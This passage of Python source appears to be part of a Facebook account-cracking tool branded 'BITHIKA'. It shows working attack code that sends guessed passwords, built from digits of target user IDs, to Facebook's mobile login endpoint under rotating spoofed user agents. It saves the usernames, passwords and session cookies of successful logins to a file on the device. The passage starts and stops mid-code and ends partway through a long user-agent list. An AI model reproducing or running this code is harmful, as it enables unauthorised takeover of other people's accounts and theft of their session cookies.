200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=popup&locale=en_GB&pl_dbl=0',
'sec-ch-prefers-color-scheme': 'dark',
'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
'sec-ch-ua-mobile': '?1',
'sec-ch-ua-model': '"23128PC33I"',
'sec-ch-ua-platform': '"Android"',
'sec-ch-ua-platform-version': '"13"',
'sec-fetch-dest': 'empty',
'sec-fetch-mode': 'cors',
'sec-fetch-site': 'same-origin',
'user-agent': au,
'x-asbd-id': '129477',
'x-fb-lsd':re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1)}
                        response = session.post(f'https://m.facebook.com/login/device-based/login/async/', data=data, headers=headers)
                        if response.status_code == 200:
                            json_response = response.json()
                            if json_response.get('status') == 'ok':
                                if json_response.get('login') == 'success':
                                    session_cookies = session.cookies.get_dict()
                                    coki = "; ".join([f"{key}={value}" for key, value in session_cookies.items()])
                                    print(f'\r\r{G}[{G}BITHIKA-OK{G}]{G} ' + cid + f' | ' + pas + '\033[1;97m')
                                    print(f"\r\r{G}[{G}COOKIE{G}]>{R} " + coki)
                                    open('/sdcard/BITHIKA-RANDOM-M4-OK.txt', 'a').write(cid + ' | ' + pas + ' |-> ' + coki + "\n")
                                    oks.append(cid)
                                    return True
                        else:
                            print(f"[ERROR] - Status code: {response.status_code}")
                            continue
                loop+=1
        except Exception as e:
                pass

def cracker(uid, pwx, tl):
    global oks
    global cps
    global twf
    global loop
    sys.stdout.write(f"\r {green}(DEV) ({loop}) (OK-{len(oks)})\r"),
    sys.stdout.flush()
    try:
        first6digit = uid[0:6]
        first7digit = uid[0:7]
        last6digit = uid[int(len(uid))-6:]
        last7digit = uid[int(len(uid))-7:]
        fullnumber = uid
        for pw in pwx:
            pw = pw.replace("first6", first6digit)
            pw = pw.replace("first7", first7digit)
            pw = pw.replace("last6", last6digit)
            pw = pw.replace("last7", last7digit)
            pw = pw.replace("fullnumber", fullnumber)
            rua = random.choice([
                "Mozilla/5.0 (Linux; Android 10; CPH1831) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36",
                "Mozilla/5.0 (Linux; Android 12; V2050 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.85 Mobile Safari/537.36",
                "Mozilla/5.0 (Linux; Android 8.0.0; RNE-L21 Build/HUAWEIRNE-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/397.0.0.23.404;]",
                "Mozilla/5.0 (Linux; Android 11; M2010J19SI Build/RKQ1.201004.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.101 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/398.0.0.21.105;]",
                "Mozilla/5.0 (Linux; Android 12; FNE-NX9 Build/HONORFNE-N29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.86 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/399.0.0.24.93;]",
                "Mozilla/5.0 (Linux; Android 8.1.0; vivo 1726 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/76.0.3809.132 Mobile Safari/537.36",
                "Mozilla/5.0 (Linux; Android 13; SM-S901B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/397.0.0.23.404;]",
                "Dalvik/2.1.0 (Linux; U; Android 13; SCG14 Build/TP1A.220624.014)",
                "Mozilla/5.0 (Linux; Android 7.0; SM-G925F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.82 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/398.0.0.21.105;]",
                "Mozilla/5.0 (Linux; Android 12; CPH2271 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/376.0.0.12.108;]",
                "Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]",
                "Mozilla/5.0 (Linux; Android 13; Infinix X6711 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.64 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/454.1.0.49.104;]",
"Mozilla/5.0 (Linux; Android 13; Infinix X6731 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.102 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/454.1.0.49.104;]",
"Mozilla/5.0 (Linux; Android 11; Infinix X698 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.102 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/454.1.0.49.104;]",
"Mozilla/5.0 (Linux; Android 13; Infinix X6711 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.102 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/454.1.0.49.104;]",
"Mozilla/5.0 (Linux; Android 13; Infinix X6711 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.102 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/454.1.0.49.104;] FBNV/1",
"Mozilla/5.0 (Linux; Android 12; Infinix X666B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/123.0.6312.29 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 13; Infinix X6711 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.102 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/454.0.0.44.104;] FBNV/1",
"Mozilla/5.0 (Linux; Android 13; Infinix X6832 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.66 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/453.0.0.40.107;]",
"Mozilla/5.0 (Linux; Android 13; Infinix X6711 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.66 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/453.0.0.40.107;]",
"Mozilla/5.0 (Linux; Android 13; Infinix X6711) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 13; Infinix X6711 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.102 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/454.0.0.44.104;]",
"Mozilla/5.0 (Linux; Android 12; Infinix X672 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.88 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/453.0.0.40.107;] FBNV/1",
"Mozilla/5.0 (Linux; Android 12; Infinix X677 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.64 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/453.0.0.40.107;]",
"Mozilla/5.0 (Linux; Android 9; Infinix X653C Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 12; Infinix X672 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.105 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/451.0.0.45.109;]",
"Mozilla/5.0 (Linux; Android 13; Infinix X6832 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.88 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/453.0.0.40.107;] FBNV/5",
"Mozilla/5.0 (Linux; Android 13; Infinix X6710 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.88 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/453.0.0.40.107;]",
"Mozilla/5.0 (Linux; Android 12; Infinix X672 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/121.0.6167.178 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/451.0.0.45.109;]",
"Mozilla/5.0 (Linux; Android 12; Infinix X677 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.64 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/451.0.0.45.109;]",
"Mozilla/5.0 (Linux; Android 13; Infinix X6711 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.64 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/454.1.0.49.104;]",
"Mozilla/5.0 (Linux; Android 8.1.0; BBF100-6 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/68.0.3440.91 Mobile Safari/537.36 OPT/6B8575B",
"Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) OPT/3.3.3 Mobile/15E148",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) OPT/3.3.3 Mobile/15E148",
"Mozilla/5.0 (Linux; Android 7.0; SM-A520F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 OPT/1.0.9",
"Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) OPT/3.2.18 Mobile/15E148",
"Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) OPT/3.3.0 Mobile/15E148",
"Mozilla/5.0 (Linux; Android 10; Redmi Note 7 Build/QKQ1.190910.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.101 Mobile Safari/537.36 OPT/1.14.51",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) OPT/3.2.13 Mobile/15E148"
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) OPT/3.2.16 Mobile/15E148",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) OPT/2.4.1 Mobile/15E148",
"Mozilla/5.0 (Linux; Android 11; ONEPLUS A6013 Build/RKQ1.201217.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.131 Mobile Safari/537.36 OPT/1.16.56",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) OPT/3.2.13 Mobile/15E148",
"Mozilla/5.0 (Linux; Android 8.0.0; FIG-LX1 Build/HUAWEIFIG-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/72.0.3626.105 Mobile Safari/537.36 OPT/1.16.56",
"Mozilla/5.0 (Linux; Android 5.0.1; GT-I9505 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.101 Mobile Safari/537.36 OPT/1.10.37",
"Mozilla/5.0 (Linux; Android 5.1.1; SM-T285 Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Safari/537.36 OPT/1.10.35",
"Mozilla/5.0 (Linux; Android 7.1.2; M6 Note Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.101 Mobile Safari/537.36 OPT/1.16.56",
"Mozilla/5.0 (Linux; Android 8.1.0; SM-J701F Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/72.0.3626.105 Mobile Safari/537.36 OPT/1.18.70",
"Mozilla/5.0 (Linux; Android 13; Infinix X6711 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.64 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/454.1.0.49.104;]",
"Mozilla/5.0 (Linux; Android 13; Infinix X6731 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.102 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/454.1.0.49.104;]",
"Mozilla/5.0 (Linux; Android 11; Infinix X698 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.102 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/454.1.0.49.104;]",
"Mozilla/5.0 (Linux; Android 13; Infinix X6711 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.102 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/454.1.0.49.104;]",
"Mozilla/5.0 (Linux; Android 13; Infinix X6711 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.102 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/454.1.0.49.104;] FBNV/1",
"Mozilla/5.0 (Linux; Android 12; Infinix X666B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/123.0.6312.29 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 13; Infinix X6711 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.102 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/454.0.0.44.104;] FBNV/1",
"Mozilla/5.0 (Linux; Android 13; Infinix X6832 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.66 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/453.0.0.40.107;]",
"Mozilla/5.0 (Linux; Android 13; Infinix X6711 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.66 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/453.0.0.40.107;]",
"Mozilla/5.0 (Linux; Android 13; Infinix X6711) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 13; Infinix X6711 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.102 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/454.0.0.44.104;]",
"Mozilla/5.0 (Linux; Android 12; Infinix X672 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.88 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/453.0.0.40.107;] FBNV/1",
"Mozilla/5.0 (Linux; Android 12; Infinix X677 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.64 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/453.0.0.40.107;]",
"Mozilla/5.0 (Linux; Android 9; Infinix X653C Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 12; Infinix X672 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.105 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/451.0.0.45.109;]",
"Mozilla/5.0 (Linux; Android 13; Infinix X6832 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.88 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/453.0.0.40.107;] FBNV/5",
"Mozilla/5.0 (Linux; Android 13; Infinix X6710 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.88 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/453.0.0.40.107;]",
"Mozilla/5.0 (Linux; Android 12; Infinix X672 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/121.0.6167.178 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/451.0.0.45.109;]",
"Mozilla/5.0 (Linux; Android 12; Infinix X677 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.64 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/451.0.0.45.109;]",
"Mozilla/5.0 (Linux; Android 13; Infinix X6711 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.64 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/454.1.0.49.104;]",
"Mozilla/5.0 (Linux; Android 8.1.0; BBF100-6 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/68.0.3440.91 Mobile Safari/537.36 OPT/6B8575B",
"Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) OPT/3.3.3 Mobile/15E148",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) OPT/3.3.3 Mobile/15E148",
"Mozilla/5.0 (Linux; Android 13; 22101316UCP Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/422.0.0.26.76;]", 
"Mozilla/5.0 (Linux; Android 12; 22101316UCP Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.227 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/414.0.0.30.113;]",
"Mozilla/5.0 (Linux; Android 12; 22101316UCP Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/432.0.0.29.102;]",
"Mozilla/5.0 (Linux; U; Android 7.0; en-in; Redmi Note 3 Pro Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.146 Mobile Safari/537.36 XiaoMi/MiuiBrowser/9.3.8",
"Mozilla/5.0 (Linux; Android 7.0; Redmi Note 3 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.0; SM-A520F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 OPT/1.0.9",
"Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) OPT/3.2.18 Mobile/15E148",
"Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) OPT/3.3.0 Mobile/15E148",
"Mozilla/5.0 (Linux; Android 10; Redmi Note 7 Build/QKQ1.190910.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.101 Mobile Safari/537.36 OPT/1.14.51",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) OPT/3.2.13 Mobile/15E148"
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) OPT/3.2.16 Mobile/15E148",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) OPT/2.4.1 Mobile/15E148",
"Mozilla/5.0 (Linux; Android 11; ONEPLUS A6013 Build/RKQ1.201217.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.131 Mobile Safari/537.36 OPT/1.16.56",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) OPT/3.2.13 Mobile/15E148",
"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.0.0; FIG-LX1 Build/HUAWEIFIG-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/72.0.3626.105 Mobile Safari/537.36 OPT/1.16.56",
"Mozilla/5.0 (Linux; Android 5.0.1; GT-I9505 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.101 Mobile Safari/537.36 OPT/1.10.37",
"Mozilla/5.0 (Linux; Android 5.1.1; SM-T285 Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Safari/537.36 OPT/1.10.35",
"Mozilla/5.0 (Linux; Android 7.1.2; M6 Note Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.101 Mobile Safari/537.36 OPT/1.16.56",
"Mozilla/5.0 (Linux; Android 8.1.0; SM-J701F Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/72.0.3626.105 Mobile Safari/537.36 OPT/1.18.70",
"Mozilla/5.0 (Linux; Android 9; Redmi 6 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.99 Mobile Safari/537.36 OPT/1.16.62",
"Mozilla/5.0 (Linux; Android 8.1.0; Redmi Go Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 OPT/1.10.35",
"Mozilla/5.0 (Linux; Android 8.1.0; SM-J415FN Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 OPT/1.16.56",
"Mozilla/5.0 (Linux; Android 9; SM-A530F Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/76.0.3809.111 Mobile Safari/537.36 OPT/1.20.73",
"Mozilla/5.0 (Linux; Android 7.0; YS900 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Safari/537.36 OPT/1.14.51",
"Mozilla/5.0 (Linux; Android 8.1.0; Redmi Go Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 OPT/1.10.35",
"Mozilla/5.0 (Linux; Android 8.1.0; SM-J415FN Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 OPT/1.16.56",
"Mozilla/5.0 (Linux; Android 8.0.0; ANE-LX1 Build/HUAWEIANE-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 OPT/1.13.48",
"Mozilla/5.0 (Linux; Android 11; 21061119DG Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/423.0.0.21.64;]",
"Mozilla/5.0 (Linux; Android 11; 21061119DG Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]",
"Mozilla/5.0 (Linux; Android 11; 21061119DG Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.92 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/347.0.0.28.237;]",
"Mozilla/5.0 (Linux; Android 13; 22041219NY Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.114 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/414.0.0.30.113;]",
"Mozilla/5.0 (Linux; Android 12; 22041219NY Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.1.0.28.72;]",
"Mozilla/5.0 (Linux; Android 10; Redmi 01A Build/01AQKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.101 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 13; 23053RN02A Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/422.0.0.26.76;]",
"Mozilla/5.0 (Linux; Android 7.1.2; Xiaomi Redmi Note 1 Build/N2G48H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.70 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.1.2; Xiaomi Redmi Note 1 Build/N2G48H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.70 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 11; 21061119DG Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/423.0.0.21.64;]",
"Mozilla/5.0 (Linux; Android 11; 21061119DG Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]",
"Mozilla/5.0 (Linux; Android 11; 21061119DG Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.92 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/347.0.0.28.237;]",
"Mozilla/5.0 (Linux; Android 13; 22041219NY Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.114 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/414.0.0.30.113;]",
"Mozilla/5.0 (Linux; Android 12; 22041219NY Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.1.0.28.72;]",
"Mozilla/5.0 (Linux; Android 10; Redmi 01A Build/01AQKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.101 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 13; 23053RN02A Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/422.0.0.26.76;]",
"Mozilla/5.0 (Linux; Android 7.1.2; Xiaomi Redmi Note 1 Build/N2G48H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.70 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.1.2; Xiaomi Redmi Note 1 Build/N2G48H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.70 Mobile Safari/537.36",
